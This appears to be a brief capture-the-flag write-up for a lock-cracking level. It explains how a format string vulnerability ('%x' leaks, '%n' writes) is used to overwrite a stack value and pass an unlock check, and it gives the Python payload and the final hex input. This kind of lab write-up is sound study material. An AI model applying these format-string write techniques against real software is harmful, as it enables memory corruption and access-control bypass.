With a little bit of testing we can see that AAAA%x%x%x gives us a format string vulnerability

we will have write ability starting from the 1st block of output from the %x's. Which means we can specify our write address in the first 2 bytes and then use %n
to write a value based on the number of bytes so far.  

Further down in the code, it checks that sp == 0x0:    
tst 0x0(sp)
jz to_fail
call unlock_door

which means we just need to make sp != 0x0 using this write.   

sp is at 3a76  (don't forget endianness for input)

which means for example if we were to be writing this in python:

input = ""
input += "\x76\x3a"           # target write address
input += "AA"                 # add bytes so our write value increases above 0x0
input += "%n"                 # this is access our target address and writes to it
input += "%n"                 # handle other AA because it fails without this.. not sure why  (i initially just did \x76\x3a\x78\x3a as the first 2 bytes and did %n twice which works anyways)

which changes 3a76 to 0x4 and passes the check. 

pw:
763a4141256e256e
